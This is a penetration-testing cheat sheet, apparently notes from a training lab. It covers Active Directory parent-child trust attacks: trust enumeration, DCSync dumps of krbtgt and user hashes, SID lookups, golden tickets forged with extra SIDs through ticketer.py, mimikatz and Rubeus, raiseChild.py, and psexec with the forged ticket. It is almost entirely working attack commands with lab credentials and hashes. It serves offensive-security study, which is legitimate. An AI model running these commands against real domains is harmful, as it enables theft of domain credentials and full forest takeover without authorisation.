- [ ] Trust RelationShip Enumeration
- [ ] Parent - Child Trust Abuse - Linux
- [ ] Parent - Child Trust Abuse - ExtraSids Attack - Mimikatz
- [ ] Parent - Child Trust Abuse - ExtraSids Attack - Rubeus

Trust RelationShip Enumeration!!!
```sh
# netexec
nxc ldap 192.168.1.48 -u raj -p Password@1 -M enum_trusts
# Powerview
Get-DomainTrust 
Get-DomainTrustMapping
# ADModule
Get-ADTrust -Filter *
(Get-AdForest).Domains
# cmd
nltest /trusted_domains
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
# Powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```
Parent - Child Trust Abuse - Linux!!!
```sh
# get domain sid
nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid

# Performing DCSync in the Child Domain
secretsdump.py logistics.inlanefreight.local/htb-student_adm:'HTB_@cademy_stdnt_admin!'@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# SID Brute Forcing using lookupsid.py
lookupsid.py logistics.inlanefreight.local/htb-student_adm:'HTB_@cademy_stdnt_admin!'@172.16.5.240
lookupsid.py logistics.inlanefreight.local/htb-student_adm:'HTB_@cademy_stdnt_admin!'@172.16.5.240 | grep "Domain SID"
lookupsid.py logistics.inlanefreight.local/htb-student_adm:'HTB_@cademy_stdnt_admin!'@172.16.5.5 | grep -B12 "Enterprise Admins"

# Ticketer
ticketer.py -nthash 80f23a248d39b8cb93df3a4a2f4199a1 -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# raiseChild
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

# Use Golden Ticket
export KRB5CCNAME=hacker.ccache
klist
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# DCSync in the parent domain
nxc smb 172.16.5.5 --use-kcache --ntds --user bross 
secretsdump.py -k -no-pass LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -just-dc-user bross 
```
Parent - Child Trust Abuse - ExtraSids Attack - Mimikatz!!!
```powershell
# mimikatz - extra sid 1
mimikatz.exe "kerberos::golden /user:Administrator /domain:child.domain.local /sid:child-SID /sids:parent-SID-519 /krbtgt:ntlm /ptt" "exit"
# Obtaining the KRBTGT Account's NT Hash
lsadump::dcsync /user:LOGISTICS\krbtgt
# Child domain SID
Get-DomainSID
# Enterprise admins group
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# Confirm No Access
ls \\academy-ea-dc01.inlanefreight.local\c$
# Forge golden ticket with Enterprise admins group SID
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
# Confirm Access
ls \\academy-ea-dc01.inlanefreight.local\c$
```
Parent - Child Trust Abuse - ExtraSids Attack - Rubeus!!!
```powershell
# Confirm No access
ls \\academy-ea-dc01.inlanefreight.local\c$
# Create a Golden Ticket
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
# View Created Ticket
klist
# Perform DCSync
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```